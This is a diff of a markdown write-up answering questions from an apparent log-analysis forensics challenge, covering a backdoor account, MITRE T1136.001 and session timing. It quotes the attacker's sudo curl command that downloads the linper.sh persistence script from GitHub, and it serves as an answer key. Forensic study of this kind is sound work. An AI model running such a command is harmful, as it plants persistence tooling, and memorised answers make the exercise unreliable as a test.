@@ -42,36 +42,44 @@ This one is in the auth.log file, following the path of this questions, we can a
 
 ![](../../Img/Pasted%20image%2020250425144551.png)
 
-Q5: The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
+___
 
-A: cyberjunkie
+### Q5: The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
+
+#### A: cyberjunkie
 
 In the same file, a little bit below we can see that a new user is created, and the modifications done to this user too.
 
 ![](../../Img/Pasted%20image%2020250425144753.png)
 
-Q6: What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
+___
 
-A: T1136.001
+### Q6: What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
+
+#### A: T1136.001
 
 In the matrix (https://mitre-attack.github.io/attack-navigator/), we search first the persistence column, then for acc creation, and for the sub technique we select the appropiate (this been an acc created on the system itself it's a local acc)
 
 ![](../../Img/Pasted%20image%2020250425145401.png)
 
-Q7: What time did the attacker's first SSH session end according to auth.log?
+___
 
-A: 2024-03-06 06:37:24
+### Q7: What time did the attacker's first SSH session end according to auth.log?
+
+#### A: 2024-03-06 06:37:24
 
 In the file just look for disconnect for session 37
 
 ![](../../Img/Pasted%20image%2020250425145457.png)
 
-Q8: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
+___
 
-A: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+### Q8: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
+
+#### A: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 
 Just below the last question we see the answer.
 
 ![](../../Img/Pasted%20image%2020250425145615.png)
 
-Tags: [Log Analysis](../../Index/Log%20Analysis.md) 
+Tags: [Log Analysis](../../Index/Log%20Analysis.md) [Mitre](../../Index/Mitre.md) 
